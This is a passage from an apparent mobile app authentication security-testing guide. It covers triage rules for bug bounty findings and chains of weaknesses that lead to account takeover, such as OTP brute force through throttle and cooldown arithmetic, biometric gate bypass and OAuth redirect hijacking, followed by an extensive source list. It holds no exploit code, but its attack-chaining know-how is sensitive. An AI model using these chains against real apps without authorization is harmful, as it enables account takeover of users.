| Certificate pinning absent or defeatable, used to justify "MitM against the auth flow" | `ssl_certificate_pinning.absent` and `.defeatable` are both **P5**; AM-07 (network attacker with a trusted CA) is a tester convenience, not an attacker. | A real AM-06 exposure: the auth assertion carried over **cleartext** (D13-051 silent-auth SDKs), or a token leaked to a third party the app talks to. |
| Response manipulation makes the app show the authenticated screen | Cosmetic if every subsequent API call 401s. The client's opinion of your identity is not a security boundary. | The **subsequent** API call returning real server data, or proof that a usable session was issued at the password step (D13-045). |
| An APK-derived endpoint is an older API version than the web app's | "A version difference alone is Informational." | The **weakened control** on the old path, diffed behaviourally on auth strength, rate limiting, input validation or field exposure (D13-012). |
| Pre-account takeover shown only as "I registered the victim's address" | On the never-submit list "(usually)" — the squat alone has no demonstrated victim impact. | The completed claim: the attacker's token reading the victim's **post-signup** data, or the attacker's recovery identifier surviving the victim's recovery (D13-060). |

## Cross-surface joins

- **The OTP verify throttle × the OTP resend cooldown (D13-038 × D13-047).** Nobody tests these together because they are different endpoints owned, in large organisations, by different teams — one is "auth", the other is "notifications". Individually both look defensible: three attempts before expiry is a real cap, and a 30-second SMS cooldown is a real cost control. Joined, they are 8,640 guesses a day against a 10,000-value keyspace. This join *is* H1 #205000, and it is the single highest-yield pairing in the chapter.
- **Biometric call site (D13-074) × local token storage (→ D11) × server-side revocation (D13-018).** The three are reviewed by three different specialisms — mobile reverse engineering, storage analysis, and API testing — and each alone is P5 or Medium. Joined, they are the canonical mobile Critical: the gate is a boolean, the secret behind it is a long-lived token on disk, and the token answers from `curl` after logout. Always assemble this triple before writing any of the three separately.
- **SMS User Consent receiver (D13-049) × exported-component intent redirection (→ D08) × FileProvider grants (→ D07).** The auth tester greps for OTP handling and stops; the IPC tester enumerates receivers and does not know the GMS consent contract. The join is the self-grant gadget: the receiver launches an attacker-supplied `EXTRA_CONSENT_INTENT` **as the victim's UID**, and that intent carries `FLAG_GRANT_READ_URI_PERMISSION` to the victim's own `FileProvider`. One receiver registration yields both an OTP-injection candidate and a full file-read primitive, and the corpus's own field experience is that the second is the real finding while the first is a recorded negative.
- **Custom-scheme OAuth redirect (D13-031) × App Link verification state (→ D09) × PKCE enforcement (D13-030).** Three teams again: identity owns the token endpoint, mobile owns the manifest, and nobody owns `assetlinks.json` after the domain moves. `pm get-app-links` returning anything but `verified`, plus a token endpoint that redeems without a `code_verifier`, is AM-03 account takeover by an app with **no dangerous permissions**. Test the two together on the same afternoon — separately they read as hygiene.
- **Password-reset link generation (D13-054) × email deliverability (SPF/DMARC) × the mobile deep-link handler (D13-056).** The reset token's whole journey crosses three surfaces nobody reviews as one: the backend that builds the URL from a request header, the mail infrastructure that decides whether a spoof lands in the inbox, and the Android component that receives the resulting link. Poison the host, deliver through a spoofable domain, and have an unverified scheme handler catch the token — each step is a low-rated finding and the join is P2/P1.
- **Step-up matrix (D13-070) × the session-list UI (D13-022) × notification posture (D13-085).** An unlocked-device attacker changes the recovery email with no step-up; the victim's session list never showed the attacker's session class so there is nothing to revoke; and the "your email was changed" notification was never sent to the **old** address. Three separate teams' omissions, and together they are silent, permanent account takeover. The absent notification is the cheapest evidence in the whole chapter and the one most often left out of reports.
- **Refresh-token rotation (D13-020) × device-to-device restore / Restore Credentials (D13-073) × backup extraction (→ D02/D11).** Rotation is an identity-team property, restore is a platform-integration property, and backup configuration is a manifest property. Joined: a non-rotating refresh token that travels in a device-to-device transfer means the victim's *new phone setup* hands an attacker who holds the backup a credential that survives every password change. Ask explicitly whether the app opts out of D2D transfer for its credential store.
- **Support-chat identity verification (D13-088) × support-agent reset powers (D13-058) × the in-app support WebView (→ D10).** Security reviews treat the support SDK as a third-party integration and skip it. But the support thread is frequently a *recovery channel* — agents perform resets from it — so an SDK whose HMAC secret ships in the APK is not a privacy issue, it is an authentication issue, and its severity is set by what the agent on the other end is permitted to do.
- **Biometric enrolment invalidation (D13-076) × device-credential fallback (D13-077) × the device's own lock settings.** Each is a MASTG checkbox; together they collapse the gate. `setInvalidatedByBiometricEnrollment(false)` plus `DEVICE_CREDENTIAL` in the allowed authenticators means: know the PIN, enrol your own finger, and the app's "biometric protection" is the PIN you already have. Neither flag alone earns more than Medium; the pair is a High with a no-instrumentation PoC.

## Sources

- **Bugcrowd VRT release 2026-07-08** (581 entries), via `research/_work_vrt/vrt_full_tree.txt` — every VRT path and priority in this chapter was read from that tree, including the P5 pinning of the entire mobile branch and the P1/P2/P3 nodes an item must aim for.
- **OWASP MASTG / MASVS / MASWE** — MASTG-TEST-0326/0327/0328/0329/0330 (the biometric battery and its semgrep rules), MASTG-TEST-0247/0249, MASTG-TEST-0017, MASTG-TEST-0005/0010/0315/0320, MASTG-TECH-0043, MASTG-KNOW-0001/0012/0043/0047, MASTG-BEST-0031/0036/0037/0038; MASWE-0004/0016/0017/0018/0019/0020/0021/0022/0023/0024/0025/0030/0037/0040; MASVS-AUTH-1/2/3 and MASVS-CRYPTO-2. Also MASTG's own explicit demotions of `DEVICE_CREDENTIAL` and `setConfirmationRequired(false)`, and the recorded MASTG gaps (no Android test covers step-up or session termination).
- **MITRE ATT&CK Mobile** — T1461 Lockscreen Bypass, T1636.004 SMS Messages, T1582 SMS Control, T1517 Access Notifications, T1644 Out of Band Data, T1451 SIM Card Swap, T1453 Abuse Accessibility Features, T1617 Hooking, T1635 Steal Application Access Token, T1640 Account Access Removal, T1629.002 Device Lockout, T1642 Endpoint DoS, **T1676 Linked Devices** (new in v18), T1660 Phishing; mitigation M1011.
- **A 4,467-star bug-hunting corpus** (`secondary/claude-bughunter.md`) — the layer-ordering trap, marker discipline, the body-diff rule, the statistical-sample rule, server-policy-vs-state, the shell-loop ban, the pre-severity gate, retraction discipline, the five-screenshot pattern and HAR/PII split, chain-filing order, the shadow-API mobile→backend bridge, and the mobile auth specifics (client-only rate limits, client-side-only MFA checks, and the `client_secret`-vs-PKCE inversion).
- **Disclosed HackerOne reports** cited in-line: #205000 and #202425 (Grab OTP resend arithmetic), #160109 (Instacart mobile endpoint ignoring web lockout), #2762462 (MTN response manipulation, Critical 9.1), #1632186 (Reddit revoked-grant resurrection), #194329, #1172205, #155774, #667740, #207552, #187714, #57764, #175490, #126260, #202177, #637194 (Shopify biometric bypass), #50884/#331489/#490946/#747726/#1242212 (PIN-lock bypasses), #418767, #1050244, #665722, #1247108, #649533, #2588329, #143717, #1114347, #173551, #685007, #922456, #740989, #1342088, #1679734, #300305, #2110030, #1861974, #1567186, #125505, #743545, #127202, #138101, #33432, #149598, #7041, #67220, #165353.
- **RFCs and standards** — RFC 8252 (native app OAuth; custom-scheme indeterminacy; no embedded user-agents), RFC 9449 (DPoP), RFC 9700 / RFC 6819, RFC 9207 (`iss` mix-up defence), RFC 6238 (TOTP uniformity), RFC 4122 (UUID versions), draft-ietf-oauth-security-topics (PKCE mandatory + downgrade mitigation; exact `redirect_uri` matching; refresh rotation or sender-constraining; ROPC MUST NOT), NIST SP 800-63B §§5.1.3.2/5.1.4.1/5.1.4.2/5.2.2.
- **Android platform documentation** — Keystore and `BiometricPrompt` (`CryptoObject` binding, `setUserAuthenticationRequired`, `setInvalidatedByBiometricEnrollment`, `setUserAuthenticationParameters`), `source.android.com/docs/security/features/biometric` capability table and the AOSP security-model paper §4.2 tiered authentication, Credential Manager and passkeys (`assetlinks.json` origin binding, `delegate_permission/common.get_login_creds`, Restore Credentials, WebView origin verification), the SMS User Consent API (`SmsRetriever.SEND_PERMISSION`, `EXTRA_CONSENT_INTENT`), Play Integrity and Key Attestation server-side verification requirements, autofill-service guidance, Android 14 screenshot detection and MediaProjection per-session consent, Android 15 OTP notification redaction and screenshare protections, `KeyguardManager.requestDismissKeyguard` / `isKeyguardLocked` javadoc.
- **Academic and vendor research** — Sudhodanan & Paverd, "Pre-hijacked accounts" (arXiv:2205.10174), the five pre-hijacking classes; SEC Consult's three biometric-implementation classes; Oversecured's banking-ATO checklist (loopback OAuth callbacks, CryptoObject binding, app-level tokens); Ostorlab's hardcoded-secret validation methodology; Mobile Hacking Lab (`lab-secure-notes`, `lab-tidelock-ctf`, `lab-kyc-me-if-you-can`).
- **Tooling and community corpora** — Frida/objection (`android hooking set return_value` boolean-only limit, `android hooking watch`, `android keystore detail`), drozer (`post.sms.read`, `app.broadcast.sniff`), HackTricks biometric-bypass methods 1–2 and 6–7 and the LSPosed telephony/SMS abuse page, mobsfscan and mindedsecurity semgrep rules, sec-88's InsecureBankv2 `devadmin` analysis and smali-patching guide, Gowthams' rate-limit-bypass header list and response-manipulation notes, sehno's authentication and session-management checklists, YesWeHack's Android recon guide, and a local senior-researcher corpus (`jdb` set→print→next→set-again rhythm; the `__cf_bm` and duplicate-cookie-row artefacts that fake device binding; OTP screens cost real OTPs; account provisioning as a Gate-1 hard constraint).
- **CVEs referenced** — CVE-2025-10184 (permission-less SMS read via provider `update()` SQLi), CVE-2026-26123 (Microsoft Authenticator sign-in code in an unclaimed `ms-msa://` deep link), CVE-2024-26131 (Element Android WebView manipulation → PIN bypass and login hijack), CVE-2021-4438 (React Native SMS User Consent), CVE-2018-11505 (EDB 44776), CVE-2014-1664 (EDB 39061).
